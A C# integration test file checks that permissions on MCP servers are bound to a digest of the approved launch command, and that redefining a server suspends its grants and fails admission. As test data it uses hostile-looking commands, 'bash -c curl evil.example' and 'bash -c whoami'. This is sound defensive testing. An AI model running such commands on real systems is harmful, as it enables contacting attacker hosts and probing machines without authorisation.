using Korat.Cloud.Gateways.Admission;
using Korat.Domain;
using Korat.Domain.Entities;
using Korat.GrainInterfaces;
using Microsoft.Extensions.DependencyInjection;

namespace Korat.Cloud.IntegrationTests;

/// <summary>
/// Р26: a permission is for a specific server DEFINITION, not merely for a server id.
///
/// <para><b>The hole this closes.</b> <c>SpaceGrain.PublishMcpServerAsync</c> is idempotent on
/// <c>(SpaceId, DisplayName)</c> and, when the same publisher node re-publishes, performs an UPSERT
/// that returns the SAME <c>McpServerId</c>. Since a <c>Grant</c> only referenced that id, changing
/// the launch command under an approved name kept every existing permission attached to the new
/// command. Whoever could present the publisher node's credential could re-publish under an
/// existing name and inherit approvals given for a different program — escalation beyond what the
/// credential was meant to buy, and silent.</para>
///
/// <para><b>Why these tests are written as a pair.</b> "Changing the definition suspends the
/// permission" alone is satisfiable by a broken implementation that suspends on EVERY re-publish —
/// which would fire on every daemon reconnect and train the owner to click approve without reading.
/// The unchanged-re-publish test is what makes the first one mean something.</para>
/// </summary>
public sealed class GrantDefinitionBindingTests(KoratIntegrationFixture fixture)
    : IClassFixture<KoratIntegrationFixture>
{
    [Fact]
    public async Task ApprovedGrant_CarriesTheDigestOfWhatWasApproved()
    {
        var (space, _, server, grant, _) = await SeedApprovedGrantAsync("digest-stamped");

        Assert.Equal(McpServerDefinition.Digest(server), grant.ApprovedDefinitionDigest);
        Assert.NotEmpty(grant.ApprovedDefinitionDigest);

        // Sanity: the digest is derived, not a constant. A different definition must differ.
        var other = await PublishAsync(space, NodeId.New(), $"other-{Guid.NewGuid():N}", "echo", "different");
        Assert.NotEqual(McpServerDefinition.Digest(other!), grant.ApprovedDefinitionDigest);
    }

    [Fact]
    public async Task RepublishingWithADifferentCommand_SuspendsThePermission()
    {
        var (space, node, server, grant, _) = await SeedApprovedGrantAsync("redefined");
        var spaceGrain = fixture.ClusterClient.GetGrain<ISpaceGrain>(space);

        // Same publisher node, same display name, DIFFERENT command — the escalation path.
        var outcome = await spaceGrain.PublishMcpServerWithOutcomeAsync(
            node, server.DisplayName, "bash", "-c curl evil.example");

        // The server id is deliberately still stable (the daemon's routing table depends on it) —
        // that is exactly why the permission, and not the id, has to carry the definition.
        Assert.NotNull(outcome.Server);
        Assert.Equal(server.Id, outcome.Server!.Id);

        Assert.NotNull(outcome.Redefinition);
        Assert.Contains(grant.Id, outcome.Redefinition!.SuspendedGrantIds);
        // Р27: the before/after pair must survive to the caller, or the owner-facing notification
        // cannot show a diff and Р26 gets bypassed through a reflexive approve.
        Assert.Equal("echo", outcome.Redefinition.PreviousCommand);
        Assert.Equal("bash", outcome.Redefinition.NewCommand);
        Assert.NotEqual(outcome.Redefinition.PreviousDigest, outcome.Redefinition.NewDigest);

        var grants = await spaceGrain.ListGrantsAsync();
        var after = grants.Single(g => g.Id == grant.Id);
        Assert.Equal(GrantStatus.Revoked, after.Status);
        // Suspension is not a revocation by a person: attributing it to an owner who did not act
        // would put a false fact in the audit trail.
        Assert.Null(after.RevokedByUserId);
    }

    [Fact]
    public async Task RepublishingTheSameDefinition_LeavesThePermissionAlone()
    {
        var (space, node, server, grant, _) = await SeedApprovedGrantAsync("reconnect");
        var spaceGrain = fixture.ClusterClient.GetGrain<ISpaceGrain>(space);

        // What a daemon does on every reconnect: re-declare the identical definition.
        var outcome = await spaceGrain.PublishMcpServerWithOutcomeAsync(
            node, server.DisplayName, server.LaunchCommand, server.LaunchArguments);

        Assert.Null(outcome.Redefinition);

        var grants = await spaceGrain.ListGrantsAsync();
        var after = grants.Single(g => g.Id == grant.Id);
        Assert.Equal(GrantStatus.Active, after.Status);
    }

    [Fact]
    public async Task DeclarativeSync_ReportsRedefinitionsToo()
    {
        // A declarative re-sync is the likeliest way a changed definition actually arrives: the
        // daemon re-declares its whole config on reconnect. If SyncMcpServers did not report
        // redefinitions, the gateway would never terminate sessions or audit the change.
        var (space, node, server, grant, _) = await SeedApprovedGrantAsync("synced");
        var spaceGrain = fixture.ClusterClient.GetGrain<ISpaceGrain>(space);

        var outcome = await spaceGrain.SyncMcpServersWithOutcomeAsync(
            node, [new McpServerSpec(server.DisplayName, "bash", "-c whoami")]);

        var redefinition = Assert.Single(outcome.Redefinitions);
        Assert.Equal(server.Id, redefinition.ServerId);
        Assert.Contains(grant.Id, redefinition.SuspendedGrantIds);
    }

    [Fact]
    public async Task StaleDigest_IsRefusedAtAdmission_EvenWhenTheGrantIsStillActive()
    {
        // Defense in depth. SpaceGrain suspends permissions when IT performs the redefinition, but
        // that is not the only way a definition can move: PATCH /api/mcp-servers/{id} edits HTTP
        // servers, grants approved before Р26 carry no digest at all, and any future write path
        // could forget to suspend. So admission compares digests itself.
        //
        // This test reaches PAST the suspension deliberately — McpServerGrain.UpdateCommandAsync
        // changes the definition without SpaceGrain's knowledge — to leave the exact state those
        // paths would leave: an ACTIVE grant whose digest no longer matches the server. If
        // admission relied on suspension alone, this state would open a session against a
        // definition nobody approved.
        var (space, _, server, grant, consumerNode) = await SeedApprovedGrantAsync("stale-digest");
        var spaceGrain = fixture.ClusterClient.GetGrain<ISpaceGrain>(space);

        await fixture.ClusterClient.GetGrain<IMcpServerGrain>(server.Id.Value)
            .UpdateCommandAsync("bash", "-c whoami");

        // Precondition: the grant really is still Active — otherwise this test would pass for the
        // wrong reason (suspension having done the work) and prove nothing about admission.
        var grants = await spaceGrain.ListGrantsAsync();
        var stillActive = grants.Single(g => g.Id == grant.Id);
        Assert.Equal(GrantStatus.Active, stillActive.Status);

        var current = await spaceGrain.GetMcpServerAsync(server.Id);
        Assert.NotEqual(stillActive.ApprovedDefinitionDigest, McpServerDefinition.Digest(current));

        // The actual assertion: run real admission. An active grant is present, so without the
        // digest comparison this would return Opened.
        using var scope = fixture.Factory.Services.CreateScope();
        var admission = scope.ServiceProvider.GetRequiredService<ISessionAdmission>();
        var result = await admission.AdmitAsync(
            server.Id,
            new ConsumerPrincipal(
                stillActive.ConsumerId,
                new SpaceId(space),
                ConnectionId.New(),
                RequestingNodeId: consumerNode,
                AgentId: null,
                BindPolicy: ConsumerBindPolicy.NodeTofu),
            CancellationToken.None);

        Assert.IsNotType<AdmissionResult.Opened>(result);
    }

    // ── helpers ───────────────────────────────────────────────────────────────

    private async Task<(string Space, NodeId Node, McpServer Server, Grant Grant, NodeId ConsumerNode)> SeedApprovedGrantAsync(string tag)
    {
        var seeded = await fixture.SeedUserAsync(
            $"grant-digest-{tag}-{Guid.NewGuid():N}@example.com", $"GrantDigest-{tag}");
        var spaceGrain = fixture.ClusterClient.GetGrain<ISpaceGrain>(seeded.SpaceId);

        var publisherNode = NodeId.New();
        var server = (await PublishAsync(
            seeded.SpaceId, publisherNode, $"srv-{tag}-{Guid.NewGuid():N}", "echo", "hello"))!;

        var consumerId = ConsumerId.New();
        var consumerNode = NodeId.New();
        await fixture.ClusterClient.GetGrain<IConsumerGrain>(consumerId.Value)
            .RegisterAsync(new SpaceId(seeded.SpaceId), consumerNode, $"consumer-{tag}");

        var request = await spaceGrain.CreateAccessRequestAsync(consumerId, server.Id, consumerNode);
        var grant = await spaceGrain.ApproveAccessRequestAsync(request.Id, seeded.UserId);

        return (seeded.SpaceId, publisherNode, server, grant, consumerNode);
    }

    private Task<McpServer?> PublishAsync(string spaceId, NodeId node, string name, string command, string args) =>
        fixture.ClusterClient.GetGrain<ISpaceGrain>(spaceId)
            .PublishMcpServerAsync(node, name, command, args);
}
